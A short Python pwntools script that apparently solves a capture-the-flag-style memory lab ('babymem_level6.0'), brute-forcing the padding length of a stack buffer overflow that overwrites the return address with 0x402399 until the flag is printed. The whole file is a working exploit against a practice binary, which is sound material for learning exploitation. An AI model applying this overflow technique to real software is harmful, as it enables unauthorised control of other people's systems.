from pwn import *
import pwn
pwn.context.update(arch = "amd64")
pwn.context.log_level = "error"
for i in range(1, 200):
    print(i)
    for n in range(0, 50):
        with pwn.process("/challenge/babymem_level6.0") as p:
            p.clean()
            p.sendline('10000')
            p.clean
            payload = b'A'*i
            payload += p32(0x402399)
            p.clean()
            p.send(payload)
            out = p.recvall().decode()
            if "pwn" in out:
                print(out)
                break
